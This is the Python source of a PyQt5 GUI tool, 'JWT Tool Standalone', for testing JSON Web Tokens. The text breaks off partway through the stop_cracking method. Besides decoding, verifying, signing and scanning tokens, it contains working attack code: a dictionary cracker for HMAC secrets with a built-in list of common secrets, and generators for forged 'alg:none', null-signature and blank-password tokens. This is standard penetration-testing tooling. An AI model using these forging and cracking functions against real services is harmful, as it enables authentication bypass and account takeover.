#!/usr/bin/env python3
"""
JWT Tool Standalone - Complete JWT Security Testing Suite
Version 2.0.0 (01_08_2025)
A single-file, comprehensive JWT analysis and testing tool
"""

import sys
import os
import json
import base64
import hmac
import hashlib
import time
import csv
import logging
import traceback
from datetime import datetime
from typing import Optional, Dict, Any, Tuple

# GUI Framework
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QTextEdit, QPushButton, QFileDialog, QMessageBox, QTabWidget,
    QComboBox, QCheckBox, QProgressBar, QGroupBox, QMenu, QScrollArea
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QTextCharFormat, QColor

# Cryptographic imports
try:
    from Cryptodome.Signature import PKCS1_v1_5, DSS, pss
    from Cryptodome.Hash import SHA256, SHA384, SHA512
    from Cryptodome.PublicKey import RSA, ECC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("WARNING: Cryptodome libraries not available - advanced signing/verification disabled")

# Network requests
try:
    import requests
    import certifi
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("WARNING: requests library not available - network features disabled")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('jwt_tool_standalone.log')
    ]
)
logger = logging.getLogger(__name__)

class JWTCore:
    """Core JWT operations with comprehensive functionality"""
    
    # Embedded wordlists for cracking
    COMMON_SECRETS = [
        "secret", "password", "123456", "admin", "root", "test", "demo",
        "qwerty", "password123", "letmein", "welcome", "monkey", "dragon",
        "your_secret", "jwt_secret", "supersecret", "topsecret", "secret123",
        "mysecret", "jwt", "key", "private", "token", "auth", "session",
        "hmac", "signature", "verify", "encode", "decode", "base64"
    ]
    
    # Cache for performance
    _cache = {}
    _cache_size = 100
    _cache_ttl = 300
    
    @classmethod
    def _cache_get(cls, key: str) -> Optional[Dict[str, Any]]:
        """Get cached result if valid"""
        if key in cls._cache:
            item = cls._cache[key]
            if time.time() - item['timestamp'] < cls._cache_ttl:
                return item['data']
            del cls._cache[key]
        return None
    
    @classmethod
    def _cache_set(cls, key: str, value: Dict[str, Any]) -> None:
        """Cache result with timestamp"""
        if len(cls._cache) >= cls._cache_size:
            oldest = min(cls._cache.items(), key=lambda x: x[1]['timestamp'])
            del cls._cache[oldest[0]]
        cls._cache[key] = {'data': value, 'timestamp': time.time()}
    
    @staticmethod
    def decode_jwt(token: str) -> Tuple[Dict[str, Any], Dict[str, Any], str]:
        """Decode JWT without validation"""
        if not token or not isinstance(token, str):
            raise ValueError("Token must be a non-empty string")
        
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError(f"Invalid token format: expected 3 parts, got {len(parts)}")
        
        headB64, paylB64, sig = parts
        
        # Decode header
        try:
            head = base64.urlsafe_b64decode(headB64 + '=' * (-len(headB64) % 4))
            headDict = json.loads(head)
        except Exception as e:
            raise ValueError(f"Invalid header: {str(e)}")
        
        # Decode payload
        try:
            payl = base64.urlsafe_b64decode(paylB64 + '=' * (-len(paylB64) % 4))
            paylDict = json.loads(payl)
        except Exception as e:
            raise ValueError(f"Invalid payload: {str(e)}")
        
        return headDict, paylDict, sig
    
    @staticmethod
    def sign_jwt(header: Dict[str, Any], payload: Dict[str, Any], key: str, algorithm: str) -> str:
        """Sign JWT with specified algorithm"""
        header['alg'] = algorithm
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        message = f"{header_b64}.{payload_b64}"
        
        if algorithm.startswith('HS'):
            hash_func = {
                'HS256': hashlib.sha256,
                'HS384': hashlib.sha384,
                'HS512': hashlib.sha512
            }.get(algorithm)
            if not hash_func:
                raise ValueError(f"Unsupported algorithm: {algorithm}")
            signature = hmac.new(key.encode(), message.encode(), hash_func).digest()
            sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            return f"{message}.{sig_b64}"
        elif algorithm.startswith('ES'):
            # ECDSA signing requires pycryptodomex (Cryptodome)
            if not CRYPTO_AVAILABLE:
                raise ValueError(f"Algorithm {algorithm} requires cryptographic libraries")
            # Determine curve/hash
            hash_map = {'ES256': SHA256, 'ES384': SHA384, 'ES512': SHA512}
            hash_cls = hash_map.get(algorithm)
            if not hash_cls:
                raise ValueError(f"Unsupported algorithm: {algorithm}")
            try:
                # key is expected to be PEM private key content or path
                priv = None
                if key.strip().startswith('-----BEGIN'):
                    priv = ECC.import_key(key)
                elif os.path.exists(key):
                    priv = ECC.import_key(open(key, 'r').read())
                else:
                    raise ValueError('EC private key not found or invalid')

                h = hash_cls.new(message.encode())
                signer = DSS.new(priv, 'fips-186-3')
                signature = signer.sign(h)
                sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
                return f"{message}.{sig_b64}"
            except Exception as e:
                raise ValueError(f"ECDSA signing failed: {e}")
        else:
            raise ValueError(f"Algorithm {algorithm} requires cryptographic libraries")
    
    @staticmethod
    def verify_jwt(token: str, key: str, check_claims: bool = True) -> Dict[str, Any]:
        """Verify JWT signature and claims"""
        result = {
            'verified': False,
            'signature_valid': False,
            'claims_valid': None,
            'errors': [],
            'warnings': []
        }
        
        try:
            header, payload, sig = JWTCore.decode_jwt(token)
            alg = header.get('alg', '').upper()
            
            if alg.startswith('HS'):
                # HMAC verification
                hash_func = {
                    'HS256': hashlib.sha256,
                    'HS384': hashlib.sha384,
                    'HS512': hashlib.sha512
                }.get(alg)
                
                if hash_func:
                    header_b64, payload_b64, _ = token.split('.')
                    message = f"{header_b64}.{payload_b64}"
                    expected_sig = base64.urlsafe_b64encode(
                        hmac.new(key.encode(), message.encode(), hash_func).digest()
                    ).decode().rstrip('=')
                    result['signature_valid'] = hmac.compare_digest(expected_sig, sig)
                else:
                    result['errors'].append(f"Unsupported algorithm: {alg}")
            elif alg.startswith('ES'):
                # ECDSA verification (requires Cryptodome)
                if not CRYPTO_AVAILABLE:
                    result['errors'].append(f"Algorithm {alg} requires cryptographic libraries")
                else:
                    hash_map = {'ES256': SHA256, 'ES384': SHA384, 'ES512': SHA512}
                    hash_cls = hash_map.get(alg)
                    if not hash_cls:
                        result['errors'].append(f"Unsupported algorithm: {alg}")
                    else:
                        try:
                            header_b64, payload_b64, sig_b64 = token.split('.')
                            message = f"{header_b64}.{payload_b64}"
                            signature = base64.urlsafe_b64decode(sig_b64 + '=' * (-len(sig_b64) % 4))
                            # key may be PEM public key content or path
                            pub = None
                            if key.strip().startswith('-----BEGIN'):
                                pub = ECC.import_key(key)
                            elif os.path.exists(key):
                                pub = ECC.import_key(open(key, 'r').read())
                            else:
                                result['errors'].append('EC public key not found or invalid')
                                pub = None

                            if pub is not None:
                                h = hash_cls.new(message.encode())
                                verifier = DSS.new(pub, 'fips-186-3')
                                try:
                                    verifier.verify(h, signature)
                                    result['signature_valid'] = True
                                except Exception:
                                    result['signature_valid'] = False
                        except Exception as e:
                            result['errors'].append(f"ECDSA verification failed: {e}")
            else:
                result['errors'].append(f"Algorithm {alg} requires cryptographic libraries")
            
            # Claims validation
            if check_claims and result['signature_valid']:
                now = int(time.time())
                claims_result = {'valid': True, 'errors': []}
                
                if 'exp' in payload:
                    exp = int(payload['exp'])
                    if exp <= now:
                        claims_result['errors'].append("Token expired")
                        claims_result['valid'] = False
                
                if 'nbf' in payload:
                    nbf = int(payload['nbf'])
                    if nbf > now:
                        claims_result['errors'].append("Token not yet valid")
                        claims_result['valid'] = False
                
                result['claims_valid'] = claims_result
            
            result['verified'] = result['signature_valid'] and (
                not check_claims or result['claims_valid']['valid']
            )
            
        except Exception as e:
            result['errors'].append(str(e))
        
        return result
    
    @staticmethod
    def scan_jwt(token: str, mode: str = "basic") -> Dict[str, Any]:
        """Comprehensive JWT security scan"""
        results = {
            'vulnerabilities': [],
            'warnings': [],
            'info': [],
            'token_info': {}
        }
        
        try:
            header, payload, sig = JWTCore.decode_jwt(token)
            
            # Token info
            results['token_info'] = {
                'algorithm': header.get('alg', 'unknown'),
                'type': header.get('typ', 'unknown'),
                'key_id': header.get('kid'),
                'claims': list(payload.keys()),
                'issued_at': payload.get('iat'),
                'expires_at': payload.get('exp'),
                'issuer': payload.get('iss'),
                'subject': payload.get('sub')
            }
            
            # Security checks
            alg = header.get('alg', '').upper()
            if alg == 'NONE':
                results['vulnerabilities'].append({
                    'title': "Algorithm 'none' vulnerability",
                    'details': "Token uses 'none' algorithm allowing signature bypass",
                    'impact': "Critical - allows token forgery"
                })
            
            if not sig or sig == "":
                results['vulnerabilities'].append({
                    'title': "Missing signature",
                    'details': "Token has no signature",
                    'impact': "Critical - no integrity protection"
                })
            
            # Claims validation
            if 'exp' not in payload:
                results['warnings'].append({
                    'message': "No expiration claim",
                    'recommendation': "Add expiration for security"
                })
            elif payload['exp'] < time.time():
                results['warnings'].append({
                    'message': "Token expired",
                    'recommendation': "Use fresh token"
                })
            
            if 'jwk' in header:
                results['vulnerabilities'].append({
                    'title': "Embedded JWK vulnerability",
                    'details': "Token contains embedded public key",
                    'impact': "Critical - key injection possible"
                })
            
            if 'jku' in header:
                results['vulnerabilities'].append({
                    'title': "JKU header vulnerability",
                    'details': "Token references external key URL",
                    'impact': "High - JWKS URL injection possible"
                })
            
        except Exception as e:
            results['errors'] = [str(e)]
        
        return results
    
    @staticmethod
    def crack_jwt(token: str, wordlist: list = None, progress_callback=None) -> Dict[str, Any]:
        """Crack JWT using dictionary attack"""
        if wordlist is None:
            wordlist = JWTCore.COMMON_SECRETS
        
        try:
            header, _, _ = JWTCore.decode_jwt(token)
            alg = header.get('alg', '').upper()
            
            if not alg.startswith('HS'):
                return {'found': False, 'error': 'Only HMAC algorithms supported'}
            
            for i, password in enumerate(wordlist):
                if progress_callback:
                    progress_callback(i, len(wordlist))
                
                try:
                    result = JWTCore.verify_jwt(token, password, check_claims=False)
                    if result['verified']:
                        return {'found': True, 'key': password, 'attempts': i + 1}
                except:
                    continue
            
            return {'found': False, 'attempts': len(wordlist)}
            
        except Exception as e:
            return {'found': False, 'error': str(e)}
    
    @staticmethod
    def exploit_jwt(token: str, exploit_type: str) -> Dict[str, Any]:
        """Generate exploited JWT tokens"""
        try:
            header, payload, _ = JWTCore.decode_jwt(token)
            
            if exploit_type == 'alg:none':
                header['alg'] = 'none'
                header_b64 = base64.urlsafe_b64encode(
                    json.dumps(header, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(
                    json.dumps(payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                return {
                    'success': True,
                    'tokens': [f"{header_b64}.{payload_b64}."],
                    'notes': "Generated 'none' algorithm token"
                }
            
            elif exploit_type == 'null signature':
                header_b64 = base64.urlsafe_b64encode(
                    json.dumps(header, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(
                    json.dumps(payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                return {
                    'success': True,
                    'tokens': [f"{header_b64}.{payload_b64}."],
                    'notes': "Generated token with null signature"
                }
            
            elif exploit_type == 'blank password':
                tokens = []
                for alg in ['HS256', 'HS384', 'HS512']:
                    try:
                        header['alg'] = alg
                        token = JWTCore.sign_jwt(header, payload, "", alg)
                        tokens.append(token)
                    except:
                        continue
                return {
                    'success': len(tokens) > 0,
                    'tokens': tokens,
                    'notes': "Generated tokens with blank password"
                }
            
            else:
                return {'success': False, 'error': f"Unknown exploit: {exploit_type}"}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}


class CrackingThread(QThread):
    """Background thread for JWT cracking"""
    progress = pyqtSignal(int, int)
    finished = pyqtSignal(dict)
    
    def __init__(self, token, wordlist_path=None):
        super().__init__()
        self.token = token
        self.wordlist_path = wordlist_path
        self.should_stop = False
    
    def run(self):
        try:
            wordlist = JWTCore.COMMON_SECRETS
            
            if self.wordlist_path and os.path.exists(self.wordlist_path):
                try:
                    with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                        wordlist = [line.strip() for line in f if line.strip()]
                except Exception as e:
                    logger.error(f"Failed to load wordlist: {e}")
            
            def progress_callback(current, total):
                if not self.should_stop:
                    self.progress.emit(current, total)
            
            result = JWTCore.crack_jwt(self.token, wordlist, progress_callback)
            self.finished.emit(result)
            
        except Exception as e:
            self.finished.emit({'found': False, 'error': str(e)})
    
    def stop(self):
        self.should_stop = True


class JWTToolGUI(QWidget):
    """Main GUI application"""
    
    def __init__(self):
        super().__init__()
        self.current_token = ""
        self.current_header = {}
        self.current_payload = {}
        self.current_signature = ""
        self.cracking_thread = None
        self.init_ui()
        logger.info("JWT Tool Standalone GUI started")
    
    def init_ui(self):
        """Initialize the user interface"""
        self.setWindowTitle("JWT Tool Standalone v2.0.0")
        self.setGeometry(100, 100, 1200, 800)
        
        # Main layout
        main_layout = QVBoxLayout()
        
        # Title
        title = QLabel("JWT Tool Standalone - Complete JWT Security Testing Suite")
        title.setStyleSheet("font-size: 16px; font-weight: bold; margin: 10px;")
        title.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(title)
        
        # Tab widget
        self.tabs = QTabWidget()
        
        # Create tabs
        self.create_decode_tab()
        self.create_verify_tab()
        self.create_sign_tab()
        self.create_tamper_tab()
        self.create_crack_tab()
        self.create_exploit_tab()
        self.create_scan_tab()
        
        main_layout.addWidget(self.tabs)
        self.setLayout(main_layout)
    
    def create_decode_tab(self):
        """Create JWT decode/inspect tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Input section
        input_group = QGroupBox("JWT Token Input")
        input_layout = QVBoxLayout()
        
        self.decode_input = QTextEdit()
        self.decode_input.setPlaceholderText("Paste your JWT token here...")
        self.decode_input.setMaximumHeight(100)
        input_layout.addWidget(self.decode_input)
        
        decode_btn = QPushButton("Decode JWT")
        decode_btn.clicked.connect(self.decode_jwt)
        input_layout.addWidget(decode_btn)
        
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)
        
        # Output section
        output_group = QGroupBox("Decoded JWT")
        output_layout = QVBoxLayout()
        
        self.decode_output = QTextEdit()
        self.decode_output.setReadOnly(True)
        output_layout.addWidget(self.decode_output)
        
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        widget.setLayout(layout)
        self.tabs.addTab(widget, "Decode/Inspect")
    
    def create_verify_tab(self):
        """Create JWT verification tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Input section
        input_group = QGroupBox("JWT Verification")
        input_layout = QVBoxLayout()
        
        self.verify_token_input = QTextEdit()
        self.verify_token_input.setPlaceholderText("Paste JWT token to verify...")
        self.verify_token_input.setMaximumHeight(80)
        input_layout.addWidget(self.verify_token_input)
        
        self.verify_key_input = QLineEdit()
        self.verify_key_input.setPlaceholderText("Enter secret key or select public key file...")
        input_layout.addWidget(self.verify_key_input)
        
        key_btn_layout = QHBoxLayout()
        select_key_btn = QPushButton("Select Key File")
        select_key_btn.clicked.connect(self.select_key_file)
        verify_btn = QPushButton("Verify JWT")
        verify_btn.clicked.connect(self.verify_jwt)
        key_btn_layout.addWidget(select_key_btn)
        key_btn_layout.addWidget(verify_btn)
        input_layout.addLayout(key_btn_layout)
        
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)
        
        # Output section
        output_group = QGroupBox("Verification Results")
        output_layout = QVBoxLayout()
        
        self.verify_output = QTextEdit()
        self.verify_output.setReadOnly(True)
        output_layout.addWidget(self.verify_output)
        
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        widget.setLayout(layout)
        self.tabs.addTab(widget, "Verify")
    
    def create_sign_tab(self):
        """Create JWT signing tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Algorithm selection
        alg_group = QGroupBox("Signing Configuration")
        alg_layout = QVBoxLayout()
        
        self.algorithm_combo = QComboBox()
        self.algorithm_combo.addItems(['HS256', 'HS384', 'HS512'])
        alg_layout.addWidget(QLabel("Algorithm:"))
        alg_layout.addWidget(self.algorithm_combo)
        
        self.sign_key_input = QLineEdit()
        self.sign_key_input.setPlaceholderText("Enter secret key...")
        alg_layout.addWidget(QLabel("Secret Key:"))
        alg_layout.addWidget(self.sign_key_input)
        
        alg_group.setLayout(alg_layout)
        layout.addWidget(alg_group)
        
        # Header and payload editors
        content_layout = QHBoxLayout()
        
        header_group = QGroupBox("Header (JSON)")
        header_layout = QVBoxLayout()
        self.header_editor = QTextEdit()
        self.header_editor.setPlainText('{\n  "typ": "JWT",\n  "alg": "HS256"\n}')
        header_layout.addWidget(self.header_editor)
        header_group.setLayout(header_layout)
        content_layout.addWidget(header_group)
        
        payload_group = QGroupBox("Payload (JSON)")
        payload_layout = QVBoxLayout()
        self.payload_editor = QTextEdit()
        self.payload_editor.setPlainText('{\n  "sub": "1234567890",\n  "name": "John Doe",\n  "iat": ' + str(int(time.time())) + '\n}')
        payload_layout.addWidget(self.payload_editor)
        payload_group.setLayout(payload_layout)
        content_layout.addWidget(payload_group)
        
        layout.addLayout(content_layout)
        
        # Sign button
        sign_btn = QPushButton("Sign JWT")
        sign_btn.clicked.connect(self.sign_jwt)
        layout.addWidget(sign_btn)
        
        # Output
        output_group = QGroupBox("Generated JWT")
        output_layout = QVBoxLayout()
        self.sign_output = QTextEdit()
        self.sign_output.setReadOnly(True)
        output_layout.addWidget(self.sign_output)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        widget.setLayout(layout)
        self.tabs.addTab(widget, "Sign")
    
    def create_tamper_tab(self):
        """Create JWT tampering/editing tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Input section
        input_group = QGroupBox("JWT Token Input")
        input_layout = QVBoxLayout()
        
        self.tamper_input = QTextEdit()
        self.tamper_input.setPlaceholderText("Paste JWT token to modify...")
        self.tamper_input.setMaximumHeight(80)
        input_layout.addWidget(self.tamper_input)
        
        load_btn = QPushButton("Load Token for Editing")
        load_btn.clicked.connect(self.load_token_for_editing)
        input_layout.addWidget(load_btn)
        
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)
        
        # Editor section
        content_layout = QHBoxLayout()
        
        header_group = QGroupBox("Header Editor")
        header_layout = QVBoxLayout()
        self.tamper_header_editor = QTextEdit()
        header_layout.addWidget(self.tamper_header_editor)
        header_group.setLayout(header_layout)
        content_layout.addWidget(header_group)
        
        payload_group = QGroupBox("Payload Editor")
        payload_layout = QVBoxLayout()
        self.tamper_payload_editor = QTextEdit()
        payload_layout.addWidget(self.tamper_payload_editor)
        payload_group.setLayout(payload_layout)
        content_layout.addWidget(payload_group)
        
        layout.addLayout(content_layout)
        
        # Generate button
        generate_btn = QPushButton("Generate Modified Token (Unsigned)")
        generate_btn.clicked.connect(self.generate_unsigned_token)
        layout.addWidget(generate_btn)
        
        # Output
        output_group = QGroupBox("Modified JWT")
        output_layout = QVBoxLayout()
        self.tamper_output = QTextEdit()
        self.tamper_output.setReadOnly(True)
        output_layout.addWidget(self.tamper_output)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        widget.setLayout(layout)
        self.tabs.addTab(widget, "Tamper/Edit")
    
    def create_crack_tab(self):
        """Create JWT cracking tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Input section
        input_group = QGroupBox("JWT Cracking")
        input_layout = QVBoxLayout()
        
        self.crack_input = QTextEdit()
        self.crack_input.setPlaceholderText("Paste JWT token to crack...")
        self.crack_input.setMaximumHeight(80)
        input_layout.addWidget(self.crack_input)
        
        # Wordlist selection
        wordlist_layout = QHBoxLayout()
        self.wordlist_path = QLineEdit()
        self.wordlist_path.setPlaceholderText("Optional: Select custom wordlist file...")
        select_wordlist_btn = QPushButton("Select Wordlist")
        select_wordlist_btn.clicked.connect(self.select_wordlist)
        wordlist_layout.addWidget(self.wordlist_path)
        wordlist_layout.addWidget(select_wordlist_btn)
        input_layout.addLayout(wordlist_layout)
        
        # Control buttons
        button_layout = QHBoxLayout()
        self.crack_btn = QPushButton("Start Cracking")
        self.crack_btn.clicked.connect(self.start_cracking)
        self.stop_crack_btn = QPushButton("Stop")
        self.stop_crack_btn.clicked.connect(self.stop_cracking)
        self.stop_crack_btn.setEnabled(False)
        button_layout.addWidget(self.crack_btn)
        button_layout.addWidget(self.stop_crack_btn)
        input_layout.addLayout(button_layout)
        
        # Progress bar
        self.crack_progress = QProgressBar()
        input_layout.addWidget(self.crack_progress)
        
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)
        
        # Output section
        output_group = QGroupBox("Cracking Results")
        output_layout = QVBoxLayout()
        self.crack_output = QTextEdit()
        self.crack_output.setReadOnly(True)
        output_layout.addWidget(self.crack_output)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        widget.setLayout(layout)
        self.tabs.addTab(widget, "Crack")
    
    def create_exploit_tab(self):
        """Create JWT exploitation tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Input section
        input_group = QGroupBox("JWT Exploitation")
        input_layout = QVBoxLayout()
        
        self.exploit_input = QTextEdit()
        self.exploit_input.setPlaceholderText("Paste JWT token to exploit...")
        self.exploit_input.setMaximumHeight(80)
        input_layout.addWidget(self.exploit_input)
        
        # Exploit type selection
        self.exploit_combo = QComboBox()
        self.exploit_combo.addItems([
            'alg:none',
            'null signature',
            'blank password',
            'key confusion',
            'spoof JWKS',
            'inject JWKS'
        ])
        input_layout.addWidget(QLabel("Exploit Type:"))
        input_layout.addWidget(self.exploit_combo)
        
        exploit_btn = QPushButton("Generate Exploit")
        exploit_btn.clicked.connect(self.generate_exploit)
        input_layout.addWidget(exploit_btn)
        
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)
        
        # Output section
        output_group = QGroupBox("Exploit Results")
        output_layout = QVBoxLayout()
        self.exploit_output = QTextEdit()
        self.exploit_output.setReadOnly(True)
        output_layout.addWidget(self.exploit_output)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        widget.setLayout(layout)
        self.tabs.addTab(widget, "Exploits")
    
    def create_scan_tab(self):
        """Create JWT security scanning tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Input section
        input_group = QGroupBox("JWT Security Scan")
        input_layout = QVBoxLayout()
        
        self.scan_input = QTextEdit()
        self.scan_input.setPlaceholderText("Paste JWT token to scan...")
        self.scan_input.setMaximumHeight(80)
        input_layout.addWidget(self.scan_input)
        
        # Scan mode selection
        self.scan_mode_combo = QComboBox()
        self.scan_mode_combo.addItems(['Basic Scan', 'Vulnerability Scan', 'Full Audit'])
        input_layout.addWidget(QLabel("Scan Mode:"))
        input_layout.addWidget(self.scan_mode_combo)
        
        scan_btn = QPushButton("Run Security Scan")
        scan_btn.clicked.connect(self.run_security_scan)
        input_layout.addWidget(scan_btn)
        
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)
        
        # Output section
        output_group = QGroupBox("Scan Results")
        output_layout = QVBoxLayout()
        self.scan_output = QTextEdit()
        self.scan_output.setReadOnly(True)
        output_layout.addWidget(self.scan_output)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        widget.setLayout(layout)
        self.tabs.addTab(widget, "Scan")
    
    def decode_jwt(self):
        """Decode and display JWT"""
        try:
            token = self.decode_input.toPlainText().strip()
            if not token:
                self.show_error("Please enter a JWT token")
                return
            
            header, payload, signature = JWTCore.decode_jwt(token)
            
            # Store current token data
            self.current_token = token
            self.current_header = header
            self.current_payload = payload
            self.current_signature = signature
            
            # Format output
            output = f"=== JWT DECODED ===\n\n"
            output += f"HEADER:\n{json.dumps(header, indent=2)}\n\n"
            output += f"PAYLOAD:\n{json.dumps(payload, indent=2)}\n\n"
            output += f"SIGNATURE:\n{signature}\n\n"
            
            # Add metadata
            output += "=== METADATA ===\n"
            output += f"Algorithm: {header.get('alg', 'Unknown')}\n"
            output += f"Type: {header.get('typ', 'Unknown')}\n"
            if 'kid' in header:
                output += f"Key ID: {header['kid']}\n"
            
            # Claims info
            if 'iss' in payload:
                output += f"Issuer: {payload['iss']}\n"
            if 'sub' in payload:
                output += f"Subject: {payload['sub']}\n"
            if 'aud' in payload:
                output += f"Audience: {payload['aud']}\n"
            if 'exp' in payload:
                exp_time = datetime.fromtimestamp(payload['exp'])
                output += f"Expires: {exp_time}\n"
            if 'iat' in payload:
                iat_time = datetime.fromtimestamp(payload['iat'])
                output += f"Issued: {iat_time}\n"
            
            self.decode_output.setPlainText(output)
            logger.info("JWT decoded successfully")
            
        except Exception as e:
            self.show_error(f"Failed to decode JWT: {str(e)}")
    
    def select_key_file(self):
        """Select key file for verification"""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Key File", "", "All Files (*.*)"
        )
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    key_content = f.read().strip()
                self.verify_key_input.setText(key_content)
            except Exception as e:
                self.show_error(f"Failed to read key file: {str(e)}")
    
    def verify_jwt(self):
        """Verify JWT signature"""
        try:
            token = self.verify_token_input.toPlainText().strip()
            key = self.verify_key_input.text().strip()
            
            if not token or not key:
                self.show_error("Please enter both token and key")
                return
            
            result = JWTCore.verify_jwt(token, key, check_claims=True)
            
            output = f"=== VERIFICATION RESULTS ===\n\n"
            output += f"Overall Verified: {'✓ YES' if result['verified'] else '✗ NO'}\n"
            output += f"Signature Valid: {'✓ YES' if result['signature_valid'] else '✗ NO'}\n"
            
            if result['claims_valid']:
                output += f"Claims Valid: {'✓ YES' if result['claims_valid']['valid'] else '✗ NO'}\n"
                if result['claims_valid']['errors']:
                    output += f"Claims Errors: {', '.join(result['claims_valid']['errors'])}\n"
            
            if result['errors']:
                output += f"\nErrors:\n"
                for error in result['errors']:
                    output += f"- {error}\n"
            
            if result['warnings']:
                output += f"\nWarnings:\n"
                for warning in result['warnings']:
                    output += f"- {warning}\n"
            
            self.verify_output.setPlainText(output)
            logger.info(f"JWT verification completed: {result['verified']}")
            
        except Exception as e:
            self.show_error(f"Verification failed: {str(e)}")
    
    def sign_jwt(self):
        """Sign JWT with provided parameters"""
        try:
            algorithm = self.algorithm_combo.currentText()
            key = self.sign_key_input.text().strip()
            header_text = self.header_editor.toPlainText().strip()
            payload_text = self.payload_editor.toPlainText().strip()
            
            if not key:
                self.show_error("Please enter a secret key")
                return
            
            # Parse JSON
            header = json.loads(header_text)
            payload = json.loads(payload_text)
            
            # Sign token
            token = JWTCore.sign_jwt(header, payload, key, algorithm)
            
            output = f"=== SIGNED JWT ===\n\n"
            output += f"Token:\n{token}\n\n"
            output += f"Algorithm: {algorithm}\n"
            output += f"Key: {key[:20]}{'...' if len(key) > 20 else ''}\n"
            
            self.sign_output.setPlainText(output)
            logger.info("JWT signed successfully")
            
        except json.JSONDecodeError as e:
            self.show_error(f"Invalid JSON: {str(e)}")
        except Exception as e:
            self.show_error(f"Signing failed: {str(e)}")
    
    def load_token_for_editing(self):
        """Load token into editors for modification"""
        try:
            token = self.tamper_input.toPlainText().strip()
            if not token:
                self.show_error("Please enter a JWT token")
                return
            
            header, payload, _ = JWTCore.decode_jwt(token)
            
            self.tamper_header_editor.setPlainText(json.dumps(header, indent=2))
            self.tamper_payload_editor.setPlainText(json.dumps(payload, indent=2))
            
            logger.info("Token loaded for editing")
            
        except Exception as e:
            self.show_error(f"Failed to load token: {str(e)}")
    
    def generate_unsigned_token(self):
        """Generate modified token without signature"""
        try:
            header_text = self.tamper_header_editor.toPlainText().strip()
            payload_text = self.tamper_payload_editor.toPlainText().strip()
            
            if not header_text or not payload_text:
                self.show_error("Please load a token first or enter header/payload")
                return
            
            # Parse JSON
            header = json.loads(header_text)
            payload = json.loads(payload_text)
            
            # Create unsigned token
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            unsigned_token = f"{header_b64}.{payload_b64}."
            
            output = f"=== MODIFIED JWT (UNSIGNED) ===\n\n"
            output += f"Token:\n{unsigned_token}\n\n"
            output += f"Note: This token has no signature and will likely be rejected\n"
            output += f"by properly configured JWT validators.\n"
            
            self.tamper_output.setPlainText(output)
            logger.info("Unsigned token generated")
            
        except json.JSONDecodeError as e:
            self.show_error(f"Invalid JSON: {str(e)}")
        except Exception as e:
            self.show_error(f"Token generation failed: {str(e)}")
    
    def select_wordlist(self):
        """Select wordlist file for cracking"""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Wordlist File", "", "Text Files (*.txt);;All Files (*.*)"
        )
        if file_path:
            self.wordlist_path.setText(file_path)
    
    def start_cracking(self):
        """Start JWT cracking process"""
        try:
            token = self.crack_input.toPlainText().strip()
            if not token:
                self.show_error("Please enter a JWT token")
                return
            
            # Validate token algorithm
            header, _, _ = JWTCore.decode_jwt(token)
            alg = header.get('alg', '').upper()
            if not alg.startswith('HS'):
                self.show_error("Can only crack HMAC-signed tokens (HS256, HS384, HS512)")
                return
            
            # Setup UI
            self.crack_btn.setEnabled(False)
            self.stop_crack_btn.setEnabled(True)
            self.crack_progress.setValue(0)
            self.crack_output.setPlainText("Starting crack attempt...\n")
            
            # Start cracking thread
            wordlist_path = self.wordlist_path.text().strip() or None
            self.cracking_thread = CrackingThread(token, wordlist_path)
            self.cracking_thread.progress.connect(self.update_crack_progress)
            self.cracking_thread.finished.connect(self.crack_finished)
            self.cracking_thread.start()
            
            logger.info("JWT cracking started")
            
        except Exception as e:
            self.show_error(f"Failed to start cracking: {str(e)}")
            self.crack_btn.setEnabled(True)
            self.stop_crack_btn.setEnabled(False)
    
    def stop_cracking(self):
        """Stop cracking process"""
